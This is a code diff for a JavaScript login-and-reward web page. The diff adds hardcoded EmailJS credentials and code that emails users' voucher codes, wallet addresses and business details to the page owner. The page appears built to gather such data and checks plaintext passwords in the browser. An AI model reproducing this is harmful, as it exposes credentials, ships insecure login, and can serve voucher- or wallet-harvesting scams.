@@ -19,17 +19,19 @@ document.addEventListener('DOMContentLoaded', () => {
     const businessName = document.getElementById('businessName');
     const businessEmail = document.getElementById('businessEmail');
 
+    const serviceID = "service_4b371jn";
+    const templateID = "template_y0f3pw9";
+    const userID = "sz2ImWOwFnVKy4qrF"; // EmailJS API Key
+
     // Login Functionality
     document.getElementById('loginBtn').addEventListener('click', () => {
         const email = openEmail.value.trim();
         const password = openPassword.value.trim();
 
         if (users[email] && users[email].password === password) {
-            // Successful login
             openScreen.classList.add('hidden');
             rewardScreen.classList.remove('hidden');
 
-            // Populate rewards screen fields
             rewardEmail.value = email;
             rewardName.value = users[email].name;
         } else {
@@ -59,17 +61,14 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
 
-        // Register user
         users[email] = { name, password };
         alert("Signup successful! Please log in.");
 
-        // Clear signup form
         signupEmail.value = '';
         signupPassword.value = '';
         confirmPassword.value = '';
         nameInput.value = '';
 
-        // Navigate back to login
         signupScreen.classList.add('hidden');
         openScreen.classList.remove('hidden');
     });
@@ -88,11 +87,9 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
 
-        // Navigate to transaction screen
         transactionScreen.classList.remove('hidden');
         rewardScreen.classList.add('hidden');
 
-        // Populate transaction screen
         document.getElementById('transName').textContent = name;
         document.getElementById('transEmail').textContent = email;
         document.getElementById('transVoucherCode').textContent = voucher;
@@ -100,36 +97,48 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('transBusinessName').textContent = business;
         document.getElementById('transBusinessEmail').textContent = businessEmailValue;
 
-        // Clear reward form fields
         voucherCode.value = '';
         walletAddress.value = '';
         businessName.value = '';
         businessEmail.value = '';
+
+        // EmailJS Send Email
+        emailjs.send(serviceID, templateID, {
+            name: name,
+            email: email,
+            voucher_code: voucher,
+            wallet_address: wallet,
+            business_name: business,
+            business_email: businessEmailValue,
+        }, userID)
+        .then(() => {
+            alert("Reward data has been emailed successfully!");
+        })
+        .catch(error => {
+            console.error("Error sending email:", error);
+            alert("Failed to send reward data. Please try again.");
+        });
     });
 
-    // Back Button from Transaction to Reward Screen
+    // Back Buttons
     document.getElementById('backToReward').addEventListener('click', () => {
         transactionScreen.classList.add('hidden');
         rewardScreen.classList.remove('hidden');
     });
 
-    // Back Button from Reward to Login Screen
     document.getElementById('backToLogin').addEventListener('click', () => {
         rewardScreen.classList.add('hidden');
         openScreen.classList.remove('hidden');
 
-        // Clear login fields
         openEmail.value = '';
         openPassword.value = '';
     });
 
-    // Navigate to Signup Screen
     document.getElementById('signupBtn').addEventListener('click', () => {
         openScreen.classList.add('hidden');
         signupScreen.classList.remove('hidden');
     });
 
-    // Back Button from Signup to Login Screen
     document.getElementById('backToOpen').addEventListener('click', () => {
         signupScreen.classList.add('hidden');
         openScreen.classList.remove('hidden');
